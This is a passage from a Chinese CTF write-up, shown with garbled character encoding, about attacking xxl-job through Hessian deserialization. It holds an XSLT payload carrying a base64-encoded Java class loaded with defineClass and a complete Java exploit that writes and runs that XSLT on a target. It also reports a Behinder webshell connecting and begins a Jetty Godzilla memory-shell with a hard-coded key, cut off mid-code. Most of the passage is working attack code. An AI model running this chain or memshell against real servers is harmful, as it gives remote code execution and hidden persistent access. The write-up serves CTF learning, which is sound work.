LbkAhgIAVy3GABottgB9tgCAEoi2AGeZAAsrLbkAhgIAV4QGAaf+vqcADzoEuwCYWRkEtwCbvyuwAAEAGAFoAWsAGwAEABwAAAByABwAAAA7AAgAPAAWAD0AGAA/ADEAQQBCAEIAWABFAHcARgCIAEkApwBKAK8ASwDCAEwAygBOAN0ATwDlAFAA6ABRAOsAUgDuAFQBHABVASwAVgE/AFcBRwBYAVoAWQFiAD8BaABeAWsAXAFtAF0BdwBfAB0AAABmAAoApwA+AEYAHwANAIgAYABHAEgACwB3AHEASQAfAAoAWACTAEoASAAIADEBMQBLAEwABwFtAAoATQBOAAQAAAF5ACMAJAAAAAgBcQAhACIAAQAWAWMATwBQAAIAGAFhACAAHwADACUAAAAMAAEACAFxACEAJgABACsAAABPAA7/ACMABwcAAgcAKAcAUQcABAcAUQEBAAD+AEAHAFMHAFUHACr+AC8HAAQHAFUHACr8ADUHAAT6ABr4AAL5AAICLSr6ABr4AAVCBwAbCwAOAAAACAADAJ0AnwChAKIAAAACAKMAAgA+AD8AAQAHAAABbQAGAAgAAACEAU24ALO2AIxOLccACyu2AH22ALZOLSq2ALi2ALxNpwBkOgQqtgC+uADCuADGOgUSrxLHBr0Af1kDEshTWQSyAM1TWQWyAM1TtgDROgYZBgS2ANcZBi0GvQAEWQMZBVNZBAO4ANtTWQUZBb64ANtTtgDfwAB/OgcZB7YA4k2nAAU6BSywAAIAFQAeACEAGwAjAH0AgAClAAMAHAAAAD4ADwAAAGUAAgBmAAkAZwANAGgAFQBrAB4AdQAhAGwAIwBuAC8AbwBNAHAAUwBxAHcAcgB9AHQAgABzAIIAdgAdAAAAUgAIAC8ATgCmAKcABQBNADAAqACpAAYAdwAGAKoAqwAHACMAXwBNAE4ABAAAAIQAIwAkAAAAAACEACAAHwABAAIAggAeAB8AAgAJAHsArACtAAMAKwAAACsABP0AFQcABAcAr0sHABv/AF4ABQcAAgcABAcABAcArwcAGwABBwCl+gABAAEA4wDkAAEABwAAAG0AAwADAAAAGisS6rYAZ5kAEisS6rYA7j0rHARgtgDysCuwAAAAAwAcAAAAEgAEAAAAegAJAHsAEAB8ABgAfgAdAAAAIAADABAACADlAOYAAgAAABoAIwAkAAAAAAAaAOcA6AABACsAAAADAAEYAAEAQgBDAAIABwAABFEABwALAAAB5iq2AQJOKrYAuDoEKhkEtgEEOgUrEwEGBL0Af1kDEhJTBL0ABFkDGQVTuAEJxgAEsacABToIEwELuAEOtgDiOgYTARC4AQ62AOI6B6cAOjoIEwESuAEOtgDiOgYTARS4AQ62AOI6B6cAHzoJEwESBC24ARe2AOI6BhMBFAQtuAEXtgDiOgcZBhMBGQS9AH9ZAxISUwS9AARZAxkFU7gBCVcZBhMBGwS9AH9ZAxISUwS9AARZAxkEU7gBCVcrEwEdBL0Af1kDGQa2AH1TBL0ABFkDGQZTuAEJVxkHEwEZBL0Af1kDEhJTBL0ABFkDGQVTuAEJVxkHEwEfBL0Af1kDEhJTBL0ABFkDEwEhU7gBCVcZBxMBIwS9AH9ZAxISUwS9AARZAyq2ASVTuAEJVxMBJ7gBDrYBKzoIpwAvOgkZBxMBLQS9AH9ZAxISUwS9AARZAyq2ASVTuAEJVxMBJwQtuAEXtgErOggrEwEvBL0Af1kDGQe2AH1TBL0ABFkDGQdTuAEJV6cAIjoJKxMBMQS9AH9ZAxkHtgB9UwS9AARZAxkHU7gBCVcZCAMyBLYBNBkIAzIFvQAEWQMrU1kEGQZTtgE3OgkrEwE4uABswAE6OgoZChkFGQm5AT4DAFenAAo6CBkItgFBsQAGABMALwAzABsANQBLAE4AGwBQAGYAaQAbAQ8BNwE6ABsBZgGDAYYAGwCFAdsB3gAbAAQAHAAAAKIAKAAAAIQABQCFAAsAhgATAIwALwCNADAAkAAzAI8ANQCUAEAAlQBLAKAATgCWAFAAmQBbAJoAZgCfAGkAmwBrAJ0AeACeAIUAogCgAKMAuwCkANgApQDzAKYBDwCpASwAqgE3AK8BOgCrATwArQFZAK4BZgCyAYMAtQGGALMBiAC0AaUAtwGtALgBwwC5Ac8AugHbAL0B3gC7AeAAvAHlAL4AHQAAANQAFQBAAA4A8wAfAAYASwADAPQAHwAHAFsADgDzAB8ABgBmAAMA9AAfAAcAawAaAE0ATgAJAFAANQD1AE4ACAE3AAMA9gD3AAgBPAAqAE0ATgAJAYgAHQBNAE4ACQFmAHUA9gD3AAgBwwAYAPgAHwAJAc8ADAD5APoACgHgAAUATQBOAAgAAAHmACMAJAAAAAAB5gAgAB8AAQAAAeYAHgAfAAIABQHhAPsArQADAAsB2wD8AOgABAATAdMA/QDoAAUAeAFuAPMAHwAGAIUBYQD0AB8ABwAlAAAAFgACATcAAwD2AP4ACAFmAHUA9gD+AAgAKwAAAIsADP4AMAcArwcAEgcAEkIHABsBWAcAG/8AGgAJBwACBwAEBwAEBwCvBwASBwASAAAHABsAAQcAG/8AGwAIBwACBwAEBwAEBwCvBwASBwASBwAEBwAEAAD3ALQHABv8ACsHAP9fBwAbHv8AOAAIBwACBwAEBwAEBwCvBwASBwASBwAEBwAEAAEHABsGAA4AAAAMAAUAoQCfAJ0BQwFFAAEBAACKAAIABwAAALIAAgAEAAAAOBJTElq4AF7AAFHAAFFMAU0DPh0rvqIAISsdMrYAYRJjtgBnmQANKx0ytgCMTacACYQDAaf/3yywAAAAAwAcAAAAIgAIAAAAwQAOAMIAEADDABgAxQAmAMYALQDHADAAwwA2AMoAHQAAACoABAASACQBRgDmAAMAAAA4ACMAJAAAAA4AKgBPAFAAAQAQACgA+wCtAAIAKwAAABAAA/4AEgcAUQcArwEd+gAFAA4AAAAIAAMAnwChAJ0ACAC/AMAAAgAHAAABBQAGAAQAAABvEwFNuAEOTCsTAU8EvQB/WQMSElO2AVIrtgDiBL0ABFkDKlO2AN/AAMjAAMiwTRMBVLgBDkwrEwFWA70Af7YBUgEDvQAEtgDfTi22AH0TAVgEvQB/WQMSElO2AVItBL0ABFkDKlO2AN/AAMjAAMiwAAEAAAAsAC0AGwAEABwAAAAaAAYAAADQAAcA0QAtANIALgDTADUA1ABJANUAHQAAADQABQAHACYBRwCrAAEASQAmAUgAHwADAC4AQQFJAE4AAgAAAG8BSgDoAAAANQA6AUcAqwABACUAAAAWAAIABwAmAUcBSwABADUAOgFHAUsAAQArAAAABgABbQcAGwAOAAAACgAEAUMAnwChAJ0ACQDDAMQAAgAHAAAA1AAEAAYAAAA+uwFjWbcBaEy7AWVZKrcBa027AWdZLLcBbk4RAQC8CDoELRkEtgFyWTYFmwAPKxkEAxUFtgF2p//rK7YBerAAAAADABwAAAAeAAcAAADaAAgA2wARANwAGgDdACEA3wAtAOAAOQDiAB0AAAA+AAYAAAA+AVkApwAAAAgANgFaAVsAAQARAC0BXAFdAAIAGgAkAV4BXwADACEAHQFgAKcABAAqABQBYQDmAAUAKwAAABwAAv8AIQAFBwDIBwFjBwFlBwFnBwDIAAD8ABcBAA4AAAAEAAEAEAAIAGoAXAACAAcAAABXAAIAAwAAABEqK7gBgk0sBLYBhSwqtgGGsAAAAAIAHAAAAA4AAwAAAOYABgDnAAsA6AAdAAAAIAADAAAAEQF7AB8AAAAAABEBfADoAAEABgALAX0BfgACAA4AAAAEAAEAGwAIAX8BgAACAAcAAADHAAMABAAAACgqtgB9TSzGABksK7YBjU4tBLYBhS2wTiy2AZBNp//puwGIWSu3AZG/AAEACQAVABYBiAAEABwAAAAmAAkAAADsAAUA7QAJAO8ADwDwABQA8QAWAPIAFwDzABwA9AAfAPYAHQAAADQABQAPAAcBfQF+AAMAFwAFAE0BiQADAAAAKAF7AB8AAAAAACgBfADoAAEABQAjAKoAqwACACUAAAAMAAEABQAjAKoBSwACACsAAAANAAP8AAUHAH9QBwGICAAOAAAABAABAYgAKABbAFwAAgAHAAAAQgAEAAIAAAAOKisDvQB/A70ABLgBCbAAAAACABwAAAAGAAEAAAD6AB0AAAAWAAIAAAAOAZIAHwAAAAAADgGTAOgAAQAOAAAACAADAJ8AnQChACkAWwEHAAIABwAAAhcAAwAJAAAAyirBAH+ZAAoqwAB/pwAHKrYAfToEAToFGQQ6BhkFxwBkGQbGAF8sxwBDGQa2AaI6BwM2CBUIGQe+ogAuGQcVCDK2AaMrtgGmmQAZGQcVCDK2Aaq+mgANGQcVCDI6BacACYQIAaf/0KcADBkGKyy2ANE6Baf/qToHGQa2AZA6Bqf/nRkFxwAMuwCfWSu3Aau/GQUEtgDXKsEAf5kAGhkFAS22AN+wOge7AJhZGQe2Aa63Aa+/GQUqLbYA37A6B7sAmFkZB7YBrrcBr78AAwAlAHIAdQCfAJwAowCkAJ0AswC6ALsAnQADABwAAABuABsAAAD+ABQA/wAXAQEAGwECACUBBAApAQYAMAEHADsBCABWAQkAXQEKAGABBwBmAQ0AaQEOAHIBEgB1ARAAdwERAH4BEgCBARQAhgEVAI8BFwCVARgAnAEaAKQBGwCmARwAswEgALsBIQC9ASIAHQAAAHoADAAzADMBRgDmAAgAMAA2AZQBlQAHAHcABwBNAZYABwCmAA0ATQGXAAcAvQANAE0BlwAHAAAAygF7AB8AAAAAAMoBkwDoAAEAAADKAZgBmQACAAAAygGaAZsAAwAUALYAqgCrAAQAFwCzAZwAqQAFABsArwGdAKsABgArAAAALwAODkMHAH/+AAgHAH8HANMHAH/9ABcHAZ4BLPkABQIIQgcAnwsNVAcAnQ5HBwCdAA4AAAAIAAMAnwChAJ0ACAGwABkAAQAHAAAAJQACAAAAAAAJuwACWbcBsVexAAAAAQAcAAAACgACAAAAKQAIACoAAA==&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;org.junit.m.EncryptionUtils&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡ŒdefineClassçš„ç±»åè®°å¾—å†™æˆæ³¨å…¥å™¨çš„ç±»åï¼Œä¸€å¼€å§‹å¿˜æ”¹äº†å¡è¿™é‡Œå¥½ä¹…æœäº†ğŸ˜­</p></blockquote><p>æœ€åå†™ä¸€ä¸ªä¸€æŠŠæ¢­çš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//è§£æxsltæ–‡ä»¶ç”Ÿæ•ˆ</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128173705623.png" alt="image-20241128173705623"></p><p>ç„¶åå†°èä¸Šçº¿</p><p><img src="https://cdn.clown2024.cn/image-20241128173725650.png" alt="image-20241128173725650"></p><p><img src="https://cdn.clown2024.cn/image-20241128173740656.png" alt="image-20241128173740656"></p><h2 id="executoræœªæˆæƒ"><a href="#executoræœªæˆæƒ" class="headerlink" title="executoræœªæˆæƒ"></a>executoræœªæˆæƒ</h2><p>å±å®æ˜¯å¹²æ— è¯­äº†ç»™æˆ‘ï¼Œæ‰“äº†åŠå¤©å‘ç°é¢˜ç›®æ˜¯æ‰“çš„executoræœªæˆæƒï¼Œé¢˜ç›®å¥½åƒæ˜¯åªç»™äº†ä¸€ä¸ªexecutorçš„ç«¯å£ï¼Œæˆ‘æœ¬åœ°æ­çš„æ‰€ä»¥adminå’Œexecutorç«¯å£éƒ½æœ‰ï¼Œç„¶åapiæœªæˆæƒä¹Ÿæ˜¯èƒ½æ­£å¸¸æ‰“ï¼Œç›´æ¥æ‰“åäº†</p><p>executoræˆ‘ä»¬è®¿é—®9999ç«¯å£ä»–çš„å›æ˜¾æ˜¯è¿™æ ·çš„</p><p><img src="https://cdn.clown2024.cn/image-20241128162332049.png" alt="image-20241128162332049"></p><p>è¿™é‡Œä¹Ÿæ˜¯ç”¨çš„hessianååºåˆ—åŒ–è¯»å–æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å»xxl-jobçš„executorçš„æºç çœ‹åˆ°jettyæœåŠ¡çš„å¯åŠ¨æºç </p><p><img src="https://cdn.clown2024.cn/image-20241128163747857.png" alt="image-20241128163747857"></p><p>è¿™é‡Œåªè®¾ç½®äº†ä¸€ä¸ªJettyServerHandlerï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ä¼šç”±è¿™ä¸ªJettyServerHandleræ¥å¤„ç†ï¼Œçœ‹ä¸€ä¸‹æºç </p><p><img src="https://cdn.clown2024.cn/image-20241128163951810.png" alt="image-20241128163951810"></p><p>å¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œä¹Ÿæ˜¯è¿›è¡ŒHessianååºåˆ—åŒ–å¤„ç†ï¼Œå’Œæˆ‘ä»¬å‰é¢adminçœ‹åˆ°çš„å¤„ç†æ–¹å¼æ˜¯ä¸€æ ·çš„</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦å»æ³¨å…¥ä¸€ä¸ªhandlerï¼Œä¹Ÿå°±æ˜¯jettyçš„å†…å­˜é©¬ï¼Œç›´æ¥æŠ„wpçš„äº†ï¼Œä¸€å¼€å§‹ç”¨å†…å­˜é©¬ç”Ÿæˆå™¨ç”Ÿæˆäº†æ‰“ä¸è¿›å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xxl.job.core;<br><br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.*;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.AbstractHandler;<br><span class="hljs-keyword">import</span> org.eclipse.jetty.server.handler.HandlerCollection;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.ref.Reference;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">//author:Boogipop</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JettyGodzillaMemshell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandler</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;3c6e0b8a9c15224a&quot;</span>; <span class="hljs-comment">// key</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;username&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">md5</span> <span class="hljs-operator">=</span> md5(pass + xc);<br>    Class payload;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            java.security.MessageDigest m;<br>            m = java.security.MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>            m.update(s.getBytes(), <span class="hljs-number">0</span>, s.length());<br>            ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.math.BigInteger(<span class="hljs-number">1</span>, m.digest()).toString(<span class="hljs-number">16</span>).toUpperCase();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyGodzillaMemshell</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span> &#123;<br>        System.out.println(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">HttpConnection</span> <span class="hljs-variable">valueField</span> <span class="hljs-operator">=</span> getValueField();<br>            <span class="hljs-type">HandlerCollection</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (HandlerCollection) valueField.getHttpChannel().getServer().getHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">mutableWhenRunning</span> <span class="hljs-operator">=</span> handler.getClass().getDeclaredField(<span class="hljs-string">&quot;_mutableWhenRunning&quot;</span>);<br>            mutableWhenRunning.setAccessible(<span class="hljs-literal">true</span>);<br>            mutableWhenRunning.set(handler,<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//            handler.addHandler(new JettyHandlerMemshell(1));</span><br>            Handler[] handlers = handler.getHandlers();<br>            Handler[] newHandlers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>[handlers.length+<span class="hljs-number">1</span>];<br>            newHandlers[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JettyGodzillaMemshell</span>(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; handlers.length; i++) &#123;<br>                newHandlers[i + <span class="hljs-number">1</span>] = handlers[i];<br>            &#125;<br>            handler.setHandlers(newHandlers);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span 